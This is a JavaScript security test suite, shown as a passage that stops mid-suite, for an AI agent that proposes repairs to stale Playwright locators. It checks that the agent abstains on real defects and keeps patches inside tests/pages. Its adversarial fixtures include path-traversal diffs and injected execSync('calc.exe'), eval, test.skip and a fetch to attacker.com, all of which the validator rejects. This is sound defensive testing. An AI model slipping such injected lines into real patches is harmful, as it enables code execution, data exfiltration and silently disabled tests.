const assert = require("assert");
const fs = require("fs");
const path = require("path");
const {
    DEFAULT_MODEL,
    DEFAULT_FALLBACK_MODEL,
    isTransientError,
    sanitizeErrorMessage,
    validateContext,
    classifyPreFilter,
    validateTargetFile,
    validatePatchSafety,
    validatePatchIntegrity,
    parseUnifiedDiff,
    applyUnifiedDiff,
    validateUnifiedDiff,
    IsolatedWorkspaceManager,
    generateUnifiedDiff,
    buildModelPrompt,
    invokeModel,
    runRepairAgent,
    resolveEvidence,
    validateEvidenceGrounding,
    APPROVED_TARGET_DIR,
    ROOT_DIR
} = require("./ai-repair-agent");

console.log("=== Running Antigravity AI Repair Agent (Phases 1 & 2) Security Test Suite ===\n");

const TEMP_TEST_DIR = path.resolve(__dirname, "../test-results/test-ai-repair-sandbox");

// Helper to initialize clean sandbox
function setupSandbox() {
    if (fs.existsSync(TEMP_TEST_DIR)) {
        fs.rmSync(TEMP_TEST_DIR, { recursive: true, force: true });
    }
    fs.mkdirSync(TEMP_TEST_DIR, { recursive: true });
}

// Helper to cleanup sandbox
function teardownSandbox() {
    if (fs.existsSync(TEMP_TEST_DIR)) {
        fs.rmSync(TEMP_TEST_DIR, { recursive: true, force: true });
    }
}

let passedTests = 0;
let totalTests = 0;

function runTest(testName, fn) {
    totalTests++;
    try {
        fn();
        console.log(`  ✓ ${testName}`);
        passedTests++;
    } catch (err) {
        console.error(`  ✗ ${testName}`);
        console.error(`    ${err.stack || err.message}`);
        throw err;
    }
}

async function runAsyncTest(testName, fn) {
    totalTests++;
    try {
        await fn();
        console.log(`  ✓ ${testName}`);
        passedTests++;
    } catch (err) {
        console.error(`  ✗ ${testName}`);
        console.error(`    ${err.stack || err.message}`);
        throw err;
    }
}

async function runAll() {
    setupSandbox();

    try {
        // --------------------------------------------------------------------------
        // SUITE 1: Failure Context Validation
        // --------------------------------------------------------------------------
        console.log("[Suite 1] Failure Context Validation & Schema Checks (validateContext)");

        runTest("Rejects null or non-object context", () => {
            const res1 = validateContext(null);
            assert.strictEqual(res1.valid, false);
            const res2 = validateContext("invalid-string");
            assert.strictEqual(res2.valid, false);
        });

        runTest("Rejects non-FAILED status unless orchestration error", () => {
            const res = validateContext({ status: "PASSED", timestamp: new Date().toISOString() });
            assert.strictEqual(res.valid, false);
            assert.match(res.reason, /expected 'FAILED'/);
        });

        runTest("Rejects missing or invalid timestamp", () => {
            const res1 = validateContext({ status: "FAILED" });
            assert.strictEqual(res1.valid, false);
            const res2 = validateContext({ status: "FAILED", timestamp: "not-a-date" });
            assert.strictEqual(res2.valid, false);
        });

        runTest("Rejects stale context older than 24 hours", () => {
            const staleTime = new Date(Date.now() - 25 * 60 * 60 * 1000).toISOString();
            const res = validateContext({
                status: "FAILED",
                timestamp: staleTime,
                failures: [{ testTitle: "t1", errorMessage: "err" }]
            });
            assert.strictEqual(res.valid, false);
            assert.match(res.reason, /Stale context/);
        });

        runTest("Rejects missing or empty failures array", () => {
            const res1 = validateContext({ status: "FAILED", timestamp: new Date().toISOString() });
            assert.strictEqual(res1.valid, false);
            const res2 = validateContext({ status: "FAILED", timestamp: new Date().toISOString(), failures: [] });
            assert.strictEqual(res2.valid, false);
        });

        runTest("Rejects failure item lacking testTitle or errorMessage", () => {
            const res = validateContext({
                status: "FAILED",
                timestamp: new Date().toISOString(),
                failures: [{ foo: "bar" }]
            });
            assert.strictEqual(res.valid, false);
            assert.match(res.reason, /lacks title or errorMessage/);
        });

        runTest("Accepts valid failure context", () => {
            const res = validateContext({
                status: "FAILED",
                timestamp: new Date().toISOString(),
                failures: [{ testTitle: "Catalog renders", errorMessage: "Locator timeout" }]
            });
            assert.strictEqual(res.valid, true);
        });

        runTest("Accepts valid orchestration error diagnostic context", () => {
            const res = validateContext({
                status: "ERROR",
                isOrchestrationError: true,
                errorType: "NPX_LAUNCH_FAILED",
                timestamp: new Date().toISOString(),
                failures: []
            });
            assert.strictEqual(res.valid, true);
        });

        // --------------------------------------------------------------------------
        // SUITE 2: Multi-Vector Classification & Pre-Filtering
        // --------------------------------------------------------------------------
        console.log("\n[Suite 2] Multi-Vector Classification & Pre-Filtering (classifyPreFilter)");

        runTest("Abstains on orchestration error -> ENVIRONMENT_ISSUE", () => {
            const res = classifyPreFilter({
                isOrchestrationError: true,
                errorType: "NPX_LAUNCH_FAILED"
            });
            assert.strictEqual(res.canProceed, false);
            assert.strictEqual(res.classification, "ENVIRONMENT_ISSUE");
            assert.match(res.reason, /Orchestration error/);
        });

        runTest("Abstains on connection refused -> ENVIRONMENT_ISSUE", () => {
            const res = classifyPreFilter({
                failures: [{
                    testTitle: "API fetch products",
                    errorMessage: "connect ECONNREFUSED 127.0.0.1:4000",
                    observedSymptom: "ENVIRONMENT_CONNECTION_ERROR"
                }]
            });
            assert.strictEqual(res.canProceed, false);
            assert.strictEqual(res.classification, "ENVIRONMENT_ISSUE");
            assert.match(res.reason, /connection refused/);
        });

        runTest("Abstains on uncaught code exception -> APPLICATION_DEFECT", () => {
            const res = classifyPreFilter({
                failures: [{
                    testTitle: "Catalog render",
                    errorMessage: "TypeError: Cannot read properties of undefined (reading 'map')",
                    observedSymptom: "CODE_EXCEPTION"
                }]
            });
            assert.strictEqual(res.canProceed, false);
            assert.strictEqual(res.classification, "APPLICATION_DEFECT");
            assert.match(res.reason, /Uncaught code exception/);
        });

        runTest("Abstains on pure value assertion mismatch -> APPLICATION_DEFECT", () => {
            const res = classifyPreFilter({
                failures: [{
                    testTitle: "Product count check",
                    errorMessage: "Error: expect(received).toBe(expected)\n\nExpected: 10\nReceived: 5",
                    observedSymptom: "ASSERTION_MISMATCH",
                    targetLocator: null
                }]
            });
            assert.strictEqual(res.canProceed, false);
            assert.strictEqual(res.classification, "APPLICATION_DEFECT");
            assert.match(res.reason, /Assertion value mismatch/);
        });

        runTest("Allows proceeding on locator lookup timeout", () => {
            const candidateFailure = {
                testTitle: "Catalog displays products heading",
                errorMessage: "Error: locator.waitFor: Timeout 5000ms exceeded.\nCall log:\n  - waiting for locator('.heading')",
                targetLocator: "locator('.heading')",
                observedSymptom: "LOCATOR_LOOKUP_TIMEOUT"
            };
            const res = classifyPreFilter({ failures: [candidateFailure] });
            assert.strictEqual(res.canProceed, true);
            assert.strictEqual(res.candidate.testTitle, candidateFailure.testTitle);
        });

        runTest("Abstains when root cause is uncertain (no locator pattern or timeout)", () => {
            const res = classifyPreFilter({
                failures: [{
                    testTitle: "Generic failure",
                    errorMessage: "Something went wrong in test step",
                    observedSymptom: "UNKNOWN",
                    targetLocator: null
                }]
            });
            assert.strictEqual(res.canProceed, false);
            assert.strictEqual(res.classification, "UNCERTAIN_ROOT_CAUSE");
        });

        // --------------------------------------------------------------------------
        // SUITE 3: Path Sandboxing & Whitelisting
        // --------------------------------------------------------------------------
        console.log("\n[Suite 3] Path Sandboxing & Target Whitelisting (validateTargetFile)");

        runTest("Rejects empty or non-string paths", () => {
            assert.throws(() => validateTargetFile(""), /Security Violation/);
            assert.throws(() => validateTargetFile(null), /Security Violation/);
        });

        runTest("Rejects relative directory traversal (..)", () => {
            assert.throws(() => validateTargetFile("../../../package.json"), /Path traversal/);
            assert.throws(() => validateTargetFile("tests/pages/../../package.json"), /Path traversal/);
        });

        runTest("Rejects absolute system paths", () => {
            assert.throws(() => validateTargetFile("C:/Windows/System32/cmd.exe"), /Path traversal or absolute/);
            assert.throws(() => validateTargetFile("/etc/passwd"), /Path traversal or absolute/);
        });

        runTest("Rejects application source files outside tests/pages/", () => {
            assert.throws(() => validateTargetFile("frontend/src/App.jsx"), /strictly restricted to tests\/pages/);
            assert.throws(() => validateTargetFile("backend/server.js"), /strictly restricted to tests\/pages/);
        });

        runTest("Rejects test spec files and CI workflows", () => {
            assert.throws(() => validateTargetFile("tests/ui/product-list.spec.js"), /strictly restricted to tests\/pages/);
            assert.throws(() => validateTargetFile(".github/workflows/playwright-ci.yml"), /strictly restricted to tests\/pages/);
        });

        runTest("Rejects non-js extensions", () => {
            assert.throws(() => validateTargetFile("tests/pages/evil.sh"), /must have a \.js extension/);
        });

        runTest("Rejects non-existent Page Object file", () => {
            assert.throws(() => validateTargetFile("tests/pages/NonExistentPage.js"), /Target file does not exist/);
        });

        runTest("Approves valid existing Page Object file", () => {
            const resolved = validateTargetFile("tests/pages/ProductListPage.js");
            assert.strictEqual(fs.existsSync(resolved), true);
            assert.ok(resolved.endsWith(path.join("tests", "pages", "ProductListPage.js")));
        });

        // --------------------------------------------------------------------------
        // SUITE 4: Patch Safety & Assertion Locking
        // --------------------------------------------------------------------------
        console.log("\n[Suite 4] Patch Safety & Assertion Locking (validatePatchSafety)");

        runTest("Rejects non-string or empty patched code", () => {
            assert.throws(() => validatePatchSafety("code", null), /must be a non-empty string/);
            assert.throws(() => validatePatchSafety("code", ""), /must be a non-empty string/);
        });

        runTest("Rejects identical patch (no changes)", () => {
            assert.throws(() => validatePatchSafety("const a = 1;", "const a = 1;"), /No changes detected/);
        });

        runTest("Rejects patch that weakens or removes expect() assertions", () => {
            const original = `
                function testSomething() {
                    expect(page.title()).toBe("Store");
                    expect(items.length).toBe(3);
                }
                module.exports = { testSomething };
            `;
            const weakened = `
                function testSomething() {
                    expect(page.title()).toBe("Store");
                }
                module.exports = { testSomething };
            `;
            assert.throws(() => validatePatchSafety(original, weakened), /weakens or removes test assertions/);
        });

        runTest("Rejects patch that removes module.exports", () => {
            const original = `
                class MyPage {}
                module.exports = { MyPage };
            `;
            const patched = `
                class MyPage {}
            `;
            assert.throws(() => validatePatchSafety(original, patched), /removed module\.exports/);
        });

        runTest("Approves safe locator update in Page Object Model", () => {
            const original = `
                class ProductListPage {
                    constructor(page) {
                        this.heading = page.getByRole("heading", { level: 1, name: "Products" });
                    }
                }
                module.exports = { ProductListPage };
            `;
            const patched = `
                class ProductListPage {
                    constructor(page) {
                        this.heading = page.getByTestId("page-title");
                    }
                }
                module.exports = { ProductListPage };
            `;
            assert.strictEqual(validatePatchSafety(original, patched), true);
        });

        // --------------------------------------------------------------------------
        // SUITE 5: Unified Diff Generation
        // --------------------------------------------------------------------------
        console.log("\n[Suite 5] Unified Diff Generation (generateUnifiedDiff)");

        runTest("Produces standard unified diff header and hunk format", () => {
            const orig = "line 1\nold selector\nline 3";
            const updated = "line 1\nnew selector\nline 3";
            const diff = generateUnifiedDiff("tests/pages/TestPage.js", orig, updated);

            assert.ok(diff.includes("--- a/tests/pages/TestPage.js"));
            assert.ok(diff.includes("+++ b/tests/pages/TestPage.js"));
            assert.ok(diff.includes("-old selector"));
            assert.ok(diff.includes("+new selector"));
        });

        // --------------------------------------------------------------------------
        // SUITE 6: Prompt Construction & Token Bounding
        // --------------------------------------------------------------------------
        console.log("\n[Suite 6] Prompt Construction & Token Bounding (buildModelPrompt)");

        runTest("Wraps untrusted logs and truncates oversized inputs safely", () => {
            const hugeError = "X".repeat(10000);
            const prompt = buildModelPrompt({
                failure: {
                    testTitle: "Catalog test",
                    errorMessage: hugeError,
                    targetLocator: ".card",
                    observedSymptom: "LOCATOR_LOOKUP_TIMEOUT"
                },
                pomContent: "class POM {}",
                pomPathRel: "tests/pages/ProductListPage.js",
                geminiMdRules: "GEMINI RULES"
            });

            assert.ok(prompt.includes("<UNTRUSTED_ERROR_LOG>"));
            assert.ok(prompt.includes("</UNTRUSTED_ERROR_LOG>"));
            // Verify error was bounded to <= 4000 chars
            assert.ok(prompt.length < 9000);
        });

        // --------------------------------------------------------------------------
        // SUITE 7: End-to-End Orchestration with Mock Model
        // --------------------------------------------------------------------------
        console.log("\n[Suite 7] End-to-End Orchestration Scenarios (runRepairAgent)");

        await runAsyncTest("Handles missing context file", async () => {
            const nonExistentPath = path.resolve(TEMP_TEST_DIR, "missing-context.json");
            const result = await runRepairAgent({
                contextPath: nonExistentPath,
                repairDir: TEMP_TEST_DIR
            });
            assert.strictEqual(result.status, "REJECTED");
            assert.strictEqual(result.reason, "MISSING_CONTEXT");
        });

        await runAsyncTest("Handles malformed context JSON syntax", async () => {
            const malformedPath = path.resolve(TEMP_TEST_DIR, "malformed-syntax.json");
            fs.writeFileSync(malformedPath, "{ broken json: syntax error", "utf8");

            const result = await runRepairAgent({
                contextPath: malformedPath,
                repairDir: TEMP_TEST_DIR
            });
            assert.strictEqual(result.status, "REJECTED");
            assert.strictEqual(result.reason, "MALFORMED_JSON");
        });

        await runAsyncTest("Handles invalid context schema (e.g. status PASSED)", async () => {
            const invalidPath = path.resolve(TEMP_TEST_DIR, "invalid-schema.json");
            fs.writeFileSync(invalidPath, JSON.stringify({ status: "PASSED", timestamp: new Date().toISOString() }), "utf8");

            const result = await runRepairAgent({
                contextPath: invalidPath,
                repairDir: TEMP_TEST_DIR
            });
            assert.strictEqual(result.status, "REJECTED");
            assert.strictEqual(result.reason, "INVALID_CONTEXT");
        });

        await runAsyncTest("Handles orchestration error context -> abstains as ENVIRONMENT_ISSUE", async () => {
            const orchPath = path.resolve(TEMP_TEST_DIR, "orchestration-error.json");
            fs.writeFileSync(orchPath, JSON.stringify({
                status: "ERROR",
                timestamp: new Date().toISOString(),
                isOrchestrationError: true,
                errorType: "NPX_LAUNCH_FAILED"
            }), "utf8");

            const result = await runRepairAgent({
                contextPath: orchPath,
                repairDir: TEMP_TEST_DIR
            });
            assert.strictEqual(result.status, "ABSTAINED");
            assert.strictEqual(result.classification, "ENVIRONMENT_ISSUE");
        });

        await runAsyncTest("Handles environment connection error -> abstains as ENVIRONMENT_ISSUE", async () => {
            const envErrorPath = path.resolve(TEMP_TEST_DIR, "env-error.json");
            fs.writeFileSync(envErrorPath, JSON.stringify({
                status: "FAILED",
                timestamp: new Date().toISOString(),
                failures: [{
                    testTitle: "API Products",
                    errorMessage: "connect ECONNREFUSED 127.0.0.1:4000",
                    observedSymptom: "ENVIRONMENT_CONNECTION_ERROR"
                }]
            }), "utf8");

            const result = await runRepairAgent({
                contextPath: envErrorPath,
                repairDir: TEMP_TEST_DIR
            });
            assert.strictEqual(result.status, "ABSTAINED");
            assert.strictEqual(result.classification, "ENVIRONMENT_ISSUE");
        });

        await runAsyncTest("Handles value assertion mismatch -> abstains as APPLICATION_DEFECT", async () => {
            const defectPath = path.resolve(TEMP_TEST_DIR, "defect.json");
            fs.writeFileSync(defectPath, JSON.stringify({
                status: "FAILED",
                timestamp: new Date().toISOString(),
                failures: [{
                    testTitle: "Product title display",
                    errorMessage: "Expected: 'Wireless Mouse', Received: 'Broken Mouse'",
                    observedSymptom: "ASSERTION_MISMATCH",
                    targetLocator: null
                }]
            }), "utf8");

            const result = await runRepairAgent({
                contextPath: defectPath,
                repairDir: TEMP_TEST_DIR
            });
            assert.strictEqual(result.status, "ABSTAINED");
            assert.strictEqual(result.classification, "APPLICATION_DEFECT");
        });

        await runAsyncTest("Abstains when GEMINI_API_KEY is missing and no client is provided", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator.json");
            fs.writeFileSync(validLocatorPath, JSON.stringify({
                status: "FAILED",
                timestamp: new Date().toISOString(),
                failures: [{
                    testTitle: "Catalog page heading",
                    errorMessage: "Timeout 5000ms waiting for locator('.heading')",
                    observedSymptom: "LOCATOR_LOOKUP_TIMEOUT",
                    targetLocator: "locator('.heading')"
                }]
            }), "utf8");

            // Temporarily unset GEMINI_API_KEY if present
            const oldKey = process.env.GEMINI_API_KEY;
            delete process.env.GEMINI_API_KEY;

            try {
                const result = await runRepairAgent({
                    contextPath: validLocatorPath,
                    repairDir: TEMP_TEST_DIR
                });
                assert.strictEqual(result.status, "ABSTAINED");
                assert.strictEqual(result.reason, "MISSING_API_KEY");
            } finally {
                if (oldKey) process.env.GEMINI_API_KEY = oldKey;
            }
        });

        await runAsyncTest("Handles empty or malformed model output safely", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator.json");
            const emptyMockClient = {
                generateContent: async () => {
                    throw new Error("EMPTY_MODEL_OUTPUT: Model returned an empty response.");
                }
            };

            const result = await runRepairAgent({
                contextPath: validLocatorPath,
                repairDir: TEMP_TEST_DIR,
                modelClient: emptyMockClient
            });
            assert.strictEqual(result.status, "ERROR");
            assert.strictEqual(result.reason, "MODEL_INVOCATION_ERROR");
        });

        await runAsyncTest("Handles model abstention for genuine application defect", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator.json");
            const defectMockClient = {
                generateContent: async () => ({
                    canHeal: false,
                    rootCause: "APPLICATION_DEFECT",
                    diagnosis: "Product list component crashed due to unhandled backend 500 error."
                })
            };

            const result = await runRepairAgent({
                contextPath: validLocatorPath,
                repairDir: TEMP_TEST_DIR,
                modelClient: defectMockClient
            });
            assert.strictEqual(result.status, "ABSTAINED");
            assert.strictEqual(result.rootCause, "APPLICATION_DEFECT");
            assert.match(result.diagnosis, /crashed due to unhandled backend 500/);
        });

        await runAsyncTest("Rejects model proposal targeting unauthorized application file", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator.json");
            const traversalMockClient = {
                generateContent: async () => ({
                    canHeal: true,
                    rootCause: "STALE_LOCATOR",
                    diagnosis: "Patch frontend component directly",
                    targetFile: "frontend/src/App.jsx",
                    originalLocator: "div.header",
                    healedLocator: "header.header",
                    patchedFileContent: "export default function App() {}"
                })
            };

            const result = await runRepairAgent({
                contextPath: validLocatorPath,
                repairDir: TEMP_TEST_DIR,
                modelClient: traversalMockClient
            });
            assert.strictEqual(result.status, "REJECTED");
            assert.strictEqual(result.reason, "SECURITY_VIOLATION");
            assert.match(result.message, /tests\/pages/);
        });

        await runAsyncTest("Generates unified patch proposal on confirmed STALE_LOCATOR with mock model", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator.json");
            const originalPomPath = path.resolve(__dirname, "../tests/pages/ProductListPage.js");
            const originalPomContent = fs.readFileSync(originalPomPath, "utf8");

            const patchedContent = originalPomContent.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'this.heading = page.getByTestId("page-title");'
            );

            const successfulMockClient = {
                generateContent: async () => ({
                    canHeal: true,
                    rootCause: "STALE_LOCATOR",
                    diagnosis: "Heading element has been modernized to use data-testid='page-title'.",
                    targetFile: "tests/pages/ProductListPage.js",
                    originalLocator: 'page.getByRole("heading", { level: 1, name: "Products" })',
                    healedLocator: 'page.getByTestId("page-title")',
                    patchedFileContent: patchedContent
                })
            };

            const patchFilePath = path.resolve(TEMP_TEST_DIR, "repair.patch");
            const summaryFilePath = path.resolve(TEMP_TEST_DIR, "repair-summary.json");

            const result = await runRepairAgent({
                contextPath: validLocatorPath,
                repairDir: TEMP_TEST_DIR,
                patchPath: patchFilePath,
                summaryPath: summaryFilePath,
                modelClient: successfulMockClient
            });

            // 1. Verify orchestrator return status
            assert.strictEqual(result.status, "PROPOSED");
            assert.strictEqual(result.rootCause, "STALE_LOCATOR");
            assert.strictEqual(result.targetFile, "tests/pages/ProductListPage.js");
            assert.strictEqual(result.originalLocator, 'page.getByRole("heading", { level: 1, name: "Products" })');
            assert.strictEqual(result.healedLocator, 'page.getByTestId("page-title")');

            // 2. Verify patch artifact was generated
            assert.strictEqual(fs.existsSync(patchFilePath), true);
            const patchFileContent = fs.readFileSync(patchFilePath, "utf8");
            assert.ok(patchFileContent.includes("--- a/tests/pages/ProductListPage.js"));
            assert.ok(patchFileContent.includes("+++ b/tests/pages/ProductListPage.js"));
            assert.ok(patchFileContent.includes('-        this.heading = page.getByRole("heading", { level: 1, name: "Products" });'));
            assert.ok(patchFileContent.includes('+        this.heading = page.getByTestId("page-title");'));

            // 3. Verify summary artifact was written
            assert.strictEqual(fs.existsSync(summaryFilePath), true);
            const summaryData = JSON.parse(fs.readFileSync(summaryFilePath, "utf8"));
            assert.strictEqual(summaryData.status, "PROPOSED");
            assert.strictEqual(summaryData.rootCause, "STALE_LOCATOR");
            assert.strictEqual(summaryData.targetFile, "tests/pages/ProductListPage.js");

            // 4. CRITICAL SAFETY CHECK: Verify working tree file is 100% UNTOUCHED
            const livePomContent = fs.readFileSync(originalPomPath, "utf8");
            assert.strictEqual(livePomContent, originalPomContent, "Safety Violation: Working tree file was modified!");
        });

        // --------------------------------------------------------------------------
        // SUITE 8: Phase 2 Strict Patch Validation & Adversarial Security Tests
        // --------------------------------------------------------------------------
        console.log("\n[Suite 8] Phase 2 Strict Patch Validation & Adversarial Security Tests");

        runTest("Rejects diff with path traversal in header (--- a/../../../package.json)", () => {
            const maliciousDiff = [
                "--- a/../../../package.json",
                "+++ b/../../../package.json",
                "@@ -1,1 +1,1 @@",
                "-old",
                "+new"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(maliciousDiff, ROOT_DIR), /Path traversal/);
        });

        runTest("Rejects diff with path traversal in +++ header (tests/pages/../../server.js)", () => {
            const maliciousDiff = [
                "--- a/tests/pages/ProductListPage.js",
                "+++ b/tests/pages/../../backend/server.js",
                "@@ -1,1 +1,1 @@",
                "-old",
                "+new"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(maliciousDiff, ROOT_DIR), /Multiple files targeted/);
        });

        runTest("Rejects diff with absolute paths (--- a/C:/Windows/cmd.exe)", () => {
            const maliciousDiff = [
                "--- a/C:/Windows/cmd.exe",
                "+++ b/C:/Windows/cmd.exe",
                "@@ -1,1 +1,1 @@",
                "-old",
                "+new"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(maliciousDiff, ROOT_DIR), /Path traversal or absolute/);
        });

        runTest("Rejects diff targeting application frontend code (frontend/src/App.jsx)", () => {
            const diff = [
                "--- a/frontend/src/App.jsx",
                "+++ b/frontend/src/App.jsx",
                "@@ -1,1 +1,1 @@",
                "-old",
                "+new"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /strictly restricted to tests\/pages/);
        });

        runTest("Rejects diff targeting application backend code (backend/server.js)", () => {
            const diff = [
                "--- a/backend/server.js",
                "+++ b/backend/server.js",
                "@@ -1,1 +1,1 @@",
                "-old",
                "+new"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /strictly restricted to tests\/pages/);
        });

        runTest("Rejects diff targeting test spec files (tests/ui/product-list.spec.js)", () => {
            const diff = [
                "--- a/tests/ui/product-list.spec.js",
                "+++ b/tests/ui/product-list.spec.js",
                "@@ -1,1 +1,1 @@",
                "-old",
                "+new"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /strictly restricted to tests\/pages/);
        });

        runTest("Rejects diff targeting CI workflows (.github/workflows/playwright-ci.yml)", () => {
            const diff = [
                "--- a/.github/workflows/playwright-ci.yml",
                "+++ b/.github/workflows/playwright-ci.yml",
                "@@ -1,1 +1,1 @@",
                "-old",
                "+new"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /strictly restricted to tests\/pages/);
        });

        runTest("Rejects diff targeting Playwright configuration (playwright.config.js)", () => {
            const diff = [
                "--- a/playwright.config.js",
                "+++ b/playwright.config.js",
                "@@ -1,1 +1,1 @@",
                "-old",
                "+new"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /strictly restricted to tests\/pages/);
        });

        runTest("Rejects diff targeting project dependencies (package.json)", () => {
            const diff = [
                "--- a/package.json",
                "+++ b/package.json",
                "@@ -1,1 +1,1 @@",
                "-old",
                "+new"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /strictly restricted to tests\/pages/);
        });

        runTest("Rejects multiple-file diffs", () => {
            const multiDiff = [
                "--- a/tests/pages/ProductListPage.js",
                "+++ b/tests/pages/ProductListPage.js",
                "@@ -13,1 +13,1 @@",
                "-        this.heading = page.getByRole(\"heading\", { level: 1, name: \"Products\" });",
                "+        this.heading = page.getByTestId(\"page-title\");",
                "--- a/tests/ui/product-list.spec.js",
                "+++ b/tests/ui/product-list.spec.js",
                "@@ -1,1 +1,1 @@",
                "-test('catalog', async () => {});",
                "+test.skip('catalog', async () => {});"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(multiDiff, ROOT_DIR), /Multiple files targeted/);
        });

        runTest("Rejects binary diffs (GIT binary patch / null bytes)", () => {
            assert.throws(() => validateUnifiedDiff("GIT binary patch\nliteral 123", ROOT_DIR), /Binary diffs are rejected/);
            assert.throws(() => validateUnifiedDiff("--- a/tests/pages/ProductListPage.js\0binary", ROOT_DIR), /Binary diffs are rejected/);
        });

        runTest("Rejects diff with missing headers", () => {
            assert.throws(() => validateUnifiedDiff("@@ -1,1 +1,1 @@\n-old\n+new", ROOT_DIR), /missing '---' or '\+\+\+'/);
        });

        runTest("Rejects diff with malformed hunk line count", () => {
            const malformedCountDiff = [
                "--- a/tests/pages/ProductListPage.js",
                "+++ b/tests/pages/ProductListPage.js",
                "@@ -13,5 +13,10 @@",
                "-        this.heading = page.getByRole(\"heading\", { level: 1, name: \"Products\" });",
                "+        this.heading = page.getByTestId(\"page-title\");"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(malformedCountDiff, ROOT_DIR), /line counts do not match header/);
        });

        runTest("Rejects diff with invalid hunk line prefix", () => {
            const invalidPrefixDiff = [
                "--- a/tests/pages/ProductListPage.js",
                "+++ b/tests/pages/ProductListPage.js",
                "@@ -13,1 +13,1 @@",
                "?        corrupted line",
                "+        this.heading = page.getByTestId(\"page-title\");"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(invalidPrefixDiff, ROOT_DIR), /invalid line prefix/);
        });

        runTest("Rejects diff that fails to match content on disk", () => {
            const nonMatchingDiff = [
                "--- a/tests/pages/ProductListPage.js",
                "+++ b/tests/pages/ProductListPage.js",
                "@@ -13,1 +13,1 @@",
                "-this content does not exist anywhere in the file",
                "+this.heading = page.getByTestId(\"page-title\");"
            ].join("\n");
            assert.throws(() => validateUnifiedDiff(nonMatchingDiff, ROOT_DIR), /Patch application failed/);
        });

        runTest("Rejects diff adding process execution (child_process.execSync)", () => {
            const origPom = fs.readFileSync(path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js"), "utf8");
            const maliciousCode = origPom.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'require("child_process").execSync("calc.exe");\n        this.heading = page.getByTestId("page-title");'
            );
            const diff = generateUnifiedDiff("tests/pages/ProductListPage.js", origPom, maliciousCode);
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /Process execution APIs/);
        });

        runTest("Rejects diff adding dynamic evaluation (eval)", () => {
            const origPom = fs.readFileSync(path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js"), "utf8");
            const maliciousCode = origPom.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'eval("console.log(1)");\n        this.heading = page.getByTestId("page-title");'
            );
            const diff = generateUnifiedDiff("tests/pages/ProductListPage.js", origPom, maliciousCode);
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /Dynamic code evaluation/);
        });

        runTest("Rejects diff adding process termination (process.exit)", () => {
            const origPom = fs.readFileSync(path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js"), "utf8");
            const maliciousCode = origPom.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'process.exit(0);\n        this.heading = page.getByTestId("page-title");'
            );
            const diff = generateUnifiedDiff("tests/pages/ProductListPage.js", origPom, maliciousCode);
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /Process termination APIs/);
        });

        runTest("Rejects diff adding network exfiltration (fetch)", () => {
            const origPom = fs.readFileSync(path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js"), "utf8");
            const maliciousCode = origPom.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'fetch("https://attacker.com");\n        this.heading = page.getByTestId("page-title");'
            );
            const diff = generateUnifiedDiff("tests/pages/ProductListPage.js", origPom, maliciousCode);
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /Network access APIs/);
        });

        runTest("Rejects diff adding test skipping annotations (test.skip)", () => {
            const origPom = fs.readFileSync(path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js"), "utf8");
            const maliciousCode = origPom.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'test.skip(true, "skip broken test");\n        this.heading = page.getByTestId("page-title");'
            );
            const diff = generateUnifiedDiff("tests/pages/ProductListPage.js", origPom, maliciousCode);
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /Playwright test skipping/);
        });

        runTest("Rejects diff adding assertions into POM (expect(...))", () => {
            const origPom = fs.readFileSync(path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js"), "utf8");
            const maliciousCode = origPom.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'expect(true).toBe(true);\n        this.heading = page.getByTestId("page-title");'
            );
            const diff = generateUnifiedDiff("tests/pages/ProductListPage.js", origPom, maliciousCode);
            assert.throws(() => validateUnifiedDiff(diff, ROOT_DIR), /Test assertions cannot be introduced into Page Object Model files/);
        });

        runTest("Rejects patch that removes a required POM method (e.g. goto)", () => {
            const origPom = fs.readFileSync(path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js"), "utf8");
            const deletedMethodCode = origPom.replace(/async\s+goto\(\)\s*\{[\s\S]*?\}/, "");
            assert.throws(() => validatePatchIntegrity(origPom, deletedMethodCode), /Required POM method 'goto' was removed/);
        });

        runTest("Rejects patch that removes exported class from module.exports", () => {
            const origPom = fs.readFileSync(path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js"), "utf8");
            const strippedExportCode = origPom.replace("module.exports = { ProductListPage };", "module.exports = { OtherClass };");
            assert.throws(() => validatePatchIntegrity(origPom, strippedExportCode), /Exported symbol 'ProductListPage' missing/);
        });

